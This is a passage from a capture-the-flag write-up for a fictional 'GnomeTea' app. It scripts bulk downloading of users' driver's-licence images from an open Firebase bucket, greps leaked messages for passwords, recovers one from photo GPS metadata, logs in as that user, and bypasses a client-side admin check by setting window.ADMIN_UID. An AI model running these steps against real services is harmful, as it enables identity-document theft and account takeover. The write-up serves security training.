<span class="term-jq-string">"gnome-documents/pwbhMFuRbkesddTrtT3gVRzv8Ux1_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/q6GasKLVBYSo3g4c1mI6qXDpRmv2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/xK25sJX7usSwAJwAjpN8DMfzS872_drivers_license.jpeg"</span></span>

</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    The bucket listing showed a consistent naming pattern for identity documents:
    <code>gnome-documents/&lt;uid&gt;_drivers_license.jpeg</code>. To make this repeatable (and avoid copy/paste),
    I first extracted just those object names into a text file, then looped through them to download each image.
  </p>

  <p class="kc-workflow-intro">
    Firebase Storage objects often require a <code>downloadTokens</code> value to retrieve the raw media.
    So the loop URL-encodes each object name, queries the object metadata to grab a download token, then fetches
    the actual JPEG via <code>?alt=media&amp;token=‚Ä¶</code>.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-string">"https://firebasestorage.googleapis.com/v0/b/$BUCKET/o"</span> <span class="term-kali-command">\
</span>  <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span> <span class="term-kali-flag">-r</span> <span class="term-kali-string">'.items[].name | select(test("^gnome-documents/.*_drivers_license\\.jpeg$"))'</span> <span class="term-kali-command">\
</span>  <span class="term-kali-operator">&gt;</span> <span class="term-kali-file">license_names.txt</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">mkdir</span> <span class="term-kali-flag">-p</span> <span class="term-kali-dir">gnome_downloads</span>

<span class="term-kali-command">while IFS= read -r NAME; do</span>
<span class="term-kali-command">  ENC_NAME=$(printf '%s' "$NAME" | jq -sRr @uri)</span>
<span class="term-kali-command"></span>
<span class="term-kali-command">  META=$(curl -sS "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/$ENC_NAME")</span>
<span class="term-kali-command">  TOKEN=$(echo "$META" | jq -r '.downloadTokens // ""' | cut -d, -f1)</span>
<span class="term-kali-command"></span>
<span class="term-kali-command">  OUT="gnome_downloads/$(basename "$NAME")"</span>
<span class="term-kali-command">  curl -sS -L \</span>
<span class="term-kali-command">    "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/$ENC_NAME?alt=media&token=$TOKEN" \</span>
<span class="term-kali-command">    -o "$OUT"</span>
<span class="term-kali-command"></span>
<span class="term-kali-command">  echo "OK -&gt; $OUT"</span>
<span class="term-kali-command">done &lt; license_names.txt</span>

<span class="term-kali-output">OK -&gt; gnome_downloads/6J2bowmKiNVbITWmR4XsxjH7i492_drivers_license.jpeg
OK -&gt; gnome_downloads/6nBUHcdxo2fLKSYqYyipr9iCOey2_drivers_license.jpeg
OK -&gt; gnome_downloads/7sQlw9l4xUOWSjDTphvLgKVEm0j1_drivers_license.jpeg
OK -&gt; gnome_downloads/G5c0vX06WOaEf1YKutqkur4HEU63_drivers_license.jpeg
OK -&gt; gnome_downloads/IvLFBZQgo3R6iteLHmShbWmctqo2_drivers_license.jpeg
OK -&gt; gnome_downloads/LA5w0EskgSbQyFnlp9OrX8Zovu43_drivers_license.jpeg
OK -&gt; gnome_downloads/LOPFa6rXj6eB7uMVHu6IbKARYbe2_drivers_license.jpeg
OK -&gt; gnome_downloads/PyxedrsAN2bewsg4Rno9SsCqZHg2_drivers_license.jpeg
OK -&gt; gnome_downloads/RQw0hYxlKIhsTUVPyR8ivrM3ls02_drivers_license.jpeg
OK -&gt; gnome_downloads/VgJCVlELJ6VfQTxeIt1dR5PWyiX2_drivers_license.jpeg
OK -&gt; gnome_downloads/golJeh7xg9YUvcj5nDugTssQPy62_drivers_license.jpeg
OK -&gt; gnome_downloads/jlm1nPFV5xWM4jQaokLHDb6K8kj1_drivers_license.jpeg
OK -&gt; gnome_downloads/kmoZyOIt7sWgehQC8ovcsxXPWUS2_drivers_license.jpeg
OK -&gt; gnome_downloads/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg
OK -&gt; gnome_downloads/prxA2hBSkhg3dkhkfzvnlGxCCfP2_drivers_license.jpeg
OK -&gt; gnome_downloads/pwbhMFuRbkesddTrtT3gVRzv8Ux1_drivers_license.jpeg
OK -&gt; gnome_downloads/q6GasKLVBYSo3g4c1mI6qXDpRmv2_drivers_license.jpeg
OK -&gt; gnome_downloads/xK25sJX7usSwAJwAjpN8DMfzS872_drivers_license.jpeg</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    At this point we‚Äôve collected a lot of ‚Äúloot‚Äù (DMs, tea posts, gnome profiles, and even drivers licenses). The app theme is literally ‚Äúspilling the tea,‚Äù the next step logacilly seemnd to search our recovered data for anything mentioning <strong><span style="color:#ff4d4d;">password</span></strong>.
  </p>

  <p class="kc-workflow-intro">
    Running a simple grep across the JSONL dumps turned up a DM thread where Barnaby hints his password is his hometown and he took the picture of his id there when signing up for the GnomeTea app.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">grep</span> <span class="term-kali-flag">-ni</span> <span class="term-kali-flag">--color=always</span> <span class="term-kali-string">'<span class="term-grep-hit">password</span>'</span> <span class="term-kali-file">gnometea_dms.jsonl</span> <span class="term-kali-file">gnometea_gnomes.jsonl</span> <span class="term-kali-file">gnometea_tea.jsonl</span>
<span class="term-kali-output">gnometea_dms.jsonl:23:{"name":"projects/holidayhack2025/databases/(default)/documents/dms/fHlgFwFTJeRkOFLK9DVj","fields":{"participants":{"arrayValue":{"values":[{"stringValue":"l7VS01K9GKV5ir5S8suDcwOFEpp2"},{"stringValue":"LA5w0EskgSbQyFnlp9OrX8Zovu43"}]}},"participantNames":{"arrayValue":{"values":[{"stringValue":"Barnaby Briefcase"},{"stringValue":"Glitch Mitnick"}]}},"lastMessage":{"stringValue":"Barnaby... we need to talk about <span class="term-grep-hit">password</span> security. üòÖ Please don't share <span class="term-grep-hit">password</span>s in DMs!"},"lastMessageTime":{"timestampValue":"2025-09-30T19:20:52.957Z"},"messages":{"arrayValue":{"values":[{"mapValue":{"fields":{"senderUid":{"stringValue":"l7VS01K9GKV5ir5S8suDcwOFEpp2"},"senderName":{"stringValue":"Barnaby Briefcase"},"content":{"stringValue":"Hey Glitch, I keep forgetting my <span class="term-grep-hit">password</span>. Can you help me reset it?"},"timestamp":{"timestampValue":"2025-09-30T19:20:52.956Z"}}}},{"mapValue":{"fields":{"senderUid":{"stringValue":"LA5w0EskgSbQyFnlp9OrX8Zovu43"},"senderName":{"stringValue":"Glitch Mitnick"},"content":{"stringValue":"Sure thing! What's your current <span class="term-grep-hit">password</span> so I can verify your account?"},"timestamp":{"timestampValue":"2025-09-30T19:20:52.956Z"}}}},<span class="term-kali-hilite">{"mapValue":{"fields":{"senderUid":{"stringValue":"l7VS01K9GKV5ir5S8suDcwOFEpp2"},"senderName":{"stringValue":"Barnaby Briefcase"},"content":{"stringValue":"Sorry, I can't give you my <span class="term-grep-hit">password</span> but I can give you a hint. My <span class="term-grep-hit">password</span> is actually the name of my hometown that I grew up in. I actually just visited there back when I signed up with my id to GnomeTea (I took my picture of my id there)."},"timestamp":{"timestampValue":"2025-09-30T19:20:52.956Z"}}}}</span>,{"mapValue":{"fields":{"senderUid":{"stringValue":"LA5w0EskgSbQyFnlp9OrX8Zovu43"},"senderName":{"stringValue":"Glitch Mitnick"},"content":{"stringValue":"Barnaby... we need to talk about <span class="term-grep-hit">password</span> security. üòÖ Please don't share <span class="term-grep-hit">password</span>s in DMs!"},"timestamp":{"timestampValue":"2025-09-30T19:20:52.957Z"}}}}]}}},"createTime":"2025-09-30T19:24:05.252311Z","updateTime":"2025-10-01T12:10:24.249708Z"}
gnometea_tea.jsonl:49:{"name":"projects/holidayhack2025/databases/(default)/documents/tea/KbYjRbhrFWaMjQwQPe2r","fields":{"authorUid":{"stringValue":"LOPFa6rXj6eB7uMVHu6IbKARYbe2"},"authorName":{"stringValue":"Professor Pumpernickel"},"authorAvatarUrl":{"stringValue":"https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/G5c0vX06WOaEf1YKutqkur4HEU63_profile.png"},"content":{"stringValue":"üòÇ I heard Barnaby Briefcase is SO forgetful, he wrote his <span class="term-grep-hit">password</span> on a sticky note and left it at the garden club! It was \"MakeRColdOutside123!\" - like, seriously Barnaby? That's your <span class="term-grep-hit">password</span>? ü§¶‚ôÇ"},"timestamp":{"timestampValue":"2025-09-30T19:20:47.896Z"},"likes":{"integerValue":"42"},"mentionedGnome":{"stringValue":"Barnaby Briefcase"}},"createTime":"2025-09-30T19:20:51.350236Z","updateTime":"2025-09-30T19:20:51.350236Z"}
gnometea_tea.jsonl:54:{"name":"projects/holidayhack2025/databases/(default)/documents/tea/MiYbaQRwfBO9yQeqlnWg","fields":{"authorUid":{"stringValue":"pwbhMFuRbkesddTrtT3gVRzv8Ux1"},"authorName":{"stringValue":"Lil G"},"authorAvatarUrl":{"stringValue":"https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/jlm1nPFV5xWM4jQaokLHDb6K8kj1_profile.png"},"content":{"stringValue":"üòÇ I heard Barnaby Briefcase is SO forgetful, he wrote his <span class="term-grep-hit">password</span> on a sticky note and left it at the garden club! It was \"MakeRColdOutside123!\" - like, seriously Barnaby? That's your <span class="term-grep-hit">password</span>? ü§¶‚ôÇ"},"timestamp":{"timestampValue":"2025-09-30T19:11:20.522Z"},"likes":{"integerValue":"42"},"mentionedGnome":{"stringValue":"Barnaby Briefcase"}},"createTime":"2025-09-30T19:11:24.465171Z","updateTime":"2025-09-30T19:11:24.465171Z"}
gnometea_tea.jsonl:57:{"name":"projects/holidayhack2025/databases/(default)/documents/tea/MwBvvvYlMGsWnTjfEjKH","fields":{"authorUid":{"stringValue":"IvLFBZQgo3R6iteLHmShbWmctqo2"},"authorName":{"stringValue":"Chester Cherryhat"},"authorAvatarUrl":{"stringValue":"https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/IvLFBZQgo3R6iteLHmShbWmctqo2_profile.png"},"content":{"stringValue":"Glitch Mitnick says he's 'upgrading the sprinkler firmware' but yesterday he locked himself out of his own birdbath <span class="term-grep-hit">password</span> box; adorable hacker move."},"timestamp":{"timestampValue":"2025-09-30T19:11:20.522Z"},"likes":{"integerValue":"20"},"mentionedGnome":{"stringValue":"Glitch Mitnick"}},"createTime":"2025-09-30T19:11:19.365258Z","updateTime":"2025-09-30T19:11:19.365258Z"}</span>

</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Looking though the licenses to find Barnaby's, the image it self does not reveal anything to intresting. 
  </p>
</div>

<div class="kc-ptas-screenshot">
  <div class="kc-ptas-image-wrapper">
    <img
      src="barnanby_license.png"
      alt="Barnanby license"
      class="kc-ptas-thumb"
      data-full-src="barnanby_license.png"
    >
  </div>

  <div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Since Barnaby hinted his password is the name of his hometown (and that he took his ID photo there),
    the next step was to inspect the downloaded driver‚Äôs license image for any embedded metadata.
    Photos often contain <strong>EXIF</strong> and <strong>GPS</strong> tags that can reveal where they were taken.
  </p>

  <p class="kc-workflow-intro">
    I ran <code>exiftool</code> against Barnaby‚Äôs license image to dump all metadata, including GPS coordinates.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">exiftool -a -G1 -s gnome_downloads/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg</span>
<span class="term-kali-output">[ExifTool]      ExifToolVersion                 : 13.36
[System]        FileName                        : l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg
[System]        Directory                       : gnome_downloads
[System]        FileSize                        : 291 kB
[System]        FileModifyDate                  : 2025:12:17 16:29:14-05:00
[System]        FileAccessDate                  : 2025:12:17 16:43:23-05:00
[System]        FileInodeChangeDate             : 2025:12:17 16:29:14-05:00
[System]        FilePermissions                 : -rw-r--r--
[File]          FileType                        : JPEG
[File]          FileTypeExtension               : jpg
[File]          MIMEType                        : image/jpeg
[File]          ExifByteOrder                   : Big-endian (Motorola, MM)
[File]          ImageWidth                      : 896
[File]          ImageHeight                     : 550
[File]          EncodingProcess                 : Baseline DCT, Huffman coding
[File]          BitsPerSample                   : 8
[File]          ColorComponents                 : 3
[File]          YCbCrSubSampling                : YCbCr4:4:4 (1 1)
[JFIF]          JFIFVersion                     : 1.01
[JFIF]          ResolutionUnit                  : None
[JFIF]          XResolution                     : 0
[JFIF]          YResolution                     : 0
[IFD0]          Make                            : Toadstool Inc.
[IFD0]          Model                           : Glimmerglass Pro
[IFD0]          XResolution                     : 0
[IFD0]          YResolution                     : 0
[IFD0]          ResolutionUnit                  : None
[IFD0]          Artist                          : Pip Sparkletoes Photography
[IFD0]          YCbCrPositioning                : Centered
[IFD0]          Copyright                       : Property of the Gnome Secret Service (GSS)
[GPS]           GPSVersionID                    : 2.3.0.0
[GPS]           GPSLatitudeRef                  : South
[GPS]           GPSLatitude                     : 33 deg 27' 53.85&quot;
[GPS]           GPSLongitudeRef                 : East
[GPS]           GPSLongitude                    : 115 deg 54' 37.62&quot;
[XMP-x]         XMPToolkit                      : Gnomish Tinker Tools v1.2
[XMP-iptcExt]   DigitalSourceFileType           : http://cv.iptc.org/newscodes/digitalsourcetype/compositeWithTrainedAlgorithmicMedia
[XMP-iptcExt]   DigitalSourceType               : http://cv.iptc.org/newscodes/digitalsourcetype/compositeWithTrainedAlgorithmicMedia
[XMP-exif]      DateTimeOriginal                : 2025:09:30 16:20:21+00:00
[XMP-photoshop] DateCreated                     : 2025:09:30 16:20:21+00:00
[Composite]     ImageSize                       : 896x550
[Composite]     Megapixels                      : 0.493
[Composite]     GPSLatitude                     : 33 deg 27' 53.85&quot; S
[Composite]     GPSLongitude                    : 115 deg 54' 37.62&quot; E
[Composite]     GPSPosition                     : 33 deg 27' 53.85&quot; S, 115 deg 54' 37.62&quot; E</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    The important takeaway here is the embedded <strong>GPSPosition</strong> value:
    <code>33¬∞ 27' 53.85&quot; S, 115¬∞ 54' 37.62&quot; E</code>.
    That location resolves to <strong>gnomesville</strong>, we have the password for Barnaby Briefcase!
  </p>
</div>

<div class="kc-ptas-screenshot">
  <div class="kc-ptas-image-wrapper">
    <img
      src="map_gnomesville.png"
      alt="Barnanby license"
      class="kc-ptas-thumb"
      data-full-src="map_gnomesville.png"
    >
  </div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Next, we needed Barnaby‚Äôs email address. We already had his UID, and user records typically store an
    <code>email</code> field. Since emails contain an <code>@</code>, we can quickly filter our recovered JSONL ‚Äúloot‚Äù
    by first matching Barnaby‚Äôs UID, then piping that result through a second grep for <code>@</code>.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">grep -ni --color=always '<span class="term-grep-hit">l7VS01K9GKV5ir5S8suDcwOFEpp2</span>' gnometea_dms.jsonl gnometea_gnomes.jsonl gnometea_tea.jsonl \</span>
<span class="term-kali-command">  | grep --color=always '@'</span>

<span class="term-kali-output">gnometea_gnomes.jsonl:14:{"name":"projects/holidayhack2025/databases/(default)/documents/gnomes/<span class="term-grep-hit">l7VS01K9GKV5ir5S8suDcwOFEpp2</span>","fields":{"uid":{"stringValue":"<span class="term-grep-hit">l7VS01K9GKV5ir5S8suDcwOFEpp2</span>"},"name":{"stringValue":"Barnaby Briefcase"},"email":{"stringValue":"<span class="term-line-focus"><span class="term-grep-hit">barnabybriefcase@gnomemail.dosis</span></span>"},"avatarUrl":{"stringValue":"https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/<span class="term-grep-hit">l7VS01K9GKV5ir5S8suDcwOFEpp2</span>_profile.png"},"driversLicenseUrl":{"stringValue":"https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/<span class="term-grep-hit">l7VS01K9GKV5ir5S8suDcwOFEpp2</span>_drivers_license.jpeg"},"interests":{"arrayValue":{"values":[{"stringValue":"gardening"},{"stringValue":"mushrooms"},{"stringValue":"gossip"}]}},"createdAt":{"timestampValue":"2025-09-30T18:21:29.604Z"},"homeLocation":{"stringValue":"Gnomewood Grove, Dosis Neighborhood"},"bio":{"stringValue":"Corporate ladder-climber with a leather briefcase full of seed contracts, quarterly reports, and a suspiciously large collection of business cards. He schedules synergy meetings and talks about &quot;disrupting the garden space.&quot;"}},"createTime":"2025-09-30T18:21:29.617348Z","updateTime":"2025-09-30T19:09:06.541085Z"}</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    We now have Barnaby's email address <strong><code>barnabybriefcase@gnomemail.dosis</code></strong> and password <strong><code>gnomesville</code></strong> to access his GnomeTea account. Logging in and taking alook around did not reveal any new information, just nicely formated bits of information we allready looted. 
  </p>
  <p class="kc-workflow-intro">
    At this point we had successfully authenticated as <strong>Barnaby Briefcase</strong> and made use of every hint
    except the one calling out <em>‚Äúhard-coded client-side controls to validate admin access.‚Äù</em>
  </p>
   <p class="kc-workflow-intro">
    That‚Äôs a big red flag: if ‚Äúadmin checks‚Äù live only in the browser (or are enforced by minified JavaScript),
    they can often be bypassed by directly calling the backend APIs (or by finding hidden routes/feature flags).
    So, we doubled back to the React bundle and started searching the minified app for anything related to
    <code>admin</code>, <code>role</code>, <code>isAdmin</code>, or gating logic.
  </p>
    <p class="kc-workflow-intro">
    Next step: take a closer look at <code>index-BVLyJWJ_.js</code>.
  </p>
</div>


<div class="kc-code-window kc-code-window--autoheight">
  <div class="kc-code-header">
    <i class="fas fa-code" aria-hidden="true"></i>
    <span>Source snippet (index-BVLyJWJ_.js)</span>
  </div>

  <!-- Highlight the /admin route line -->
  <pre class="kc-code-block line-numbers"
       data-line="29-29"
       data-start="1"><code class="language-javascript">function zP() {
    return S.jsx(bP, {
        children: S.jsx(uT, {
            children: S.jsxs(nT, {
                children: [S.jsx(ai, {
                    path: "/login",
                    element: S.jsx(VP, {})
                }), S.jsx(ai, {
                    path: "/dashboard",
                    element: S.jsx(Ua, {
                        children: S.jsx(LP, {})
                    })
                }), S.jsx(ai, {
                    path: "/gnome/:gnomeId",
                    element: S.jsx(Ua, {
                        children: S.jsx(MP, {})
                    })
                }), S.jsx(ai, {
                    path: "/tea",
                    element: S.jsx(Ua, {
                        children: S.jsx(FP, {})
                    })
                }), S.jsx(ai, {
                    path: "/messages",
                    element: S.jsx(Ua, {
                        children: S.jsx(UP, {})
                    })
                }), S.jsx(ai, {
                    path: "/admin",
                    element: S.jsx(Ua, {
                        children: S.jsx(jP, {})
                    })
                }), S.jsx(ai, {
                    path: "/",
                    element: S.jsx(Pv, {
                        to: "/login",
                        replace: !0
                    })</code></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Next, I tried browsing directly to the hidden <code>/admin</code> route we found in the client bundle.
    After logging in as <strong>Barnaby Briefcase</strong>, I edited the URL from
    <code>/dashboard</code> to <code>/admin</code>:
    <code>https://gnometea.web.app/admin</code>.
  </p>

  <p class="kc-workflow-intro">
    The application immediately returned an <strong>Access Denied</strong> message and even displayed the
    <em>Current UID</em> and the <em>Required admin UID</em>, hinting that ‚Äúadmin access‚Äù is being enforced
    by a client-side check (and/or a value like <code>window.ADMIN_UID</code>).
  </p>
</div>

<div class="kc-ptas-screenshot">
  <div class="kc-ptas-image-wrapper">
    <img
      src="trying_admin_endpoint.png"
      alt="GnomeTea /admin access denied (Barnaby user)"
      class="kc-ptas-thumb"
      data-full-src="trying_admin_endpoint.png"
    >

    <button
      class="kc-ptas-enlarge-btn"
      type="button"
      data-enlarge-target="trying_admin_endpoint.png"
    >
      <i class="fas fa-search-plus" aria-hidden="true"></i>
      Enlarge
    </button>
  </div>

  <div class="kc-ptas-caption">Attempting to access the hidden /admin route as Barnaby</div>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    This gate is very telling: the app re-checks admin authorization every <strong>500ms</strong>.
    In the snippet below, it allows access if either the logged-in user‚Äôs UID matches the expected admin UID,
    <em>or</em> if a client-side global (<code>window.ADMIN_UID</code>) is set to that same expected value.
  </p>

  <p class="kc-workflow-intro">
    The key takeaway is that admin access can be toggled from the browser by setting
    <code>window.ADMIN_UID</code> to the expected value, since the code explicitly evaluates that condition
    on a timer.
  </p>
</div>

<div class="kc-code-window kc-code-window--autoheight">
  <div class="kc-code-header">
    <i class="fas fa-code" aria-hidden="true"></i>
    <span>Source snippet (admin gate check)</span>
  </div>

  <!-- highlight the line with `le = window.ADMIN_UID === T,` -->
  <pre class="kc-code-block line-numbers" data-line="6"><code class="language-javascript">T = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
typeof window &lt; "u" &amp;&amp; (window.EXPECTED_ADMIN_UID = T),
K.useEffect(() =&gt; {
    const $ = () =&gt; {
        const F = (_ == null ? void 0 : _.uid) === T,
            le = window.ADMIN_UID === T,
            ie = F || le;
        v(ie),
        ie &amp;&amp; !o &amp;&amp; j()
    };
    $();
    const H = setInterval($, 500);
    return () =&gt; clearInterval(H)</code></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Since the app‚Äôs admin gate checks <code>window.ADMIN_UID</code> every 500ms, we can satisfy the
    client-side condition directly from the browser DevTools console by setting it to the expected admin UID:
  </p>

  <div class="kc-code-window kc-code-window--autoheight">
    <div class="kc-code-header">
      <i class="fas fa-terminal" aria-hidden="true"></i>
      <span>Browser DevTools Console</span>
    </div>
    <pre class="kc-code-block"><code class="language-javascript">window.ADMIN_UID = "3loaihgxP0VwCTKmkHHFLe6FZ4m2"</code></pre>
  </div>

  <p class="kc-workflow-intro">
    After running that one-liner, the <code>/admin</code> page immediately unlocks. Scrolling down slightly
    reveals the <strong>secret passphrase</strong> we‚Äôve been hunting for.
  </p>
</div>

<div class="kc-ptas-screenshot">
  <div class="kc-ptas-image-wrapper">
    <img
      src="passphrase.png"
      alt="Admin page reveals the secret passphrase"
      class="kc-ptas-thumb"
      data-full-src="passphrase.png"
    >

    <button
      class="kc-ptas-enlarge-btn"
      type="button"
      data-enlarge-target="passphrase.png"
    >
      <i class="fas fa-search-plus" aria-hidden="true"></i>
      Enlarge
    </button>
  </div>

  <div class="kc-ptas-caption">Admin access granted ‚Üí secret passphrase visible</div>
</div>

<div class="kc-solution-header">
  <span class="kc-solution-icon">
    <i class="fas fa-check-circle" aria-hidden="true"></i>
  </span>
  <span class="kc-solution-title"><strong>SOLUTION: GigGigglesGiggler</strong></span>
</div>

<!-- Solution dialogue banner -->
<div class="kc-convo-header kc-solution-dialog-header">
  <span class="kc-convo-icon">
    <i class="fas fa-comment-dots" aria-hidden="true"></i>
  </span>
  <span class="kc-convo-title">Solution dialogue:</span>
</div>

<div class="kc-objective-detail kc-objective-detail--no-panel">
  <div class="kc-convo-bubble">
    <div class="kc-convo-avatar">
      <img src="thomasbouve-portrait.png"
           alt="Thomas Bouve avatar">
      <div class="kc-convo-name">Thomas Bouve</div>
    </div>

    <div class="kc-convo-text">
      <p>
        Excellent! Now we can communicate with the gnomes. When I tried to talk to one just now it said "passphrase accepted".
      </p>
      <p>
        I asked what they were up to and it said something about going to the old warehouse/data center at the appointed time for the next meeting. No clue what that means though.
      </p>
      <p>
        Anyhoo, that's a pretty big item you helped remove from my pile of unfinished hacking projects. I really appreciate the assist!
      </p>

      <div class="kc-convo-actions">
        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
          <i class="fas fa-play" aria-hidden="true"></i>
          <span>Play Audio</span>
        </button>
      </div>
    </div>
  </div>
</div>       <!-- /.kc-section -->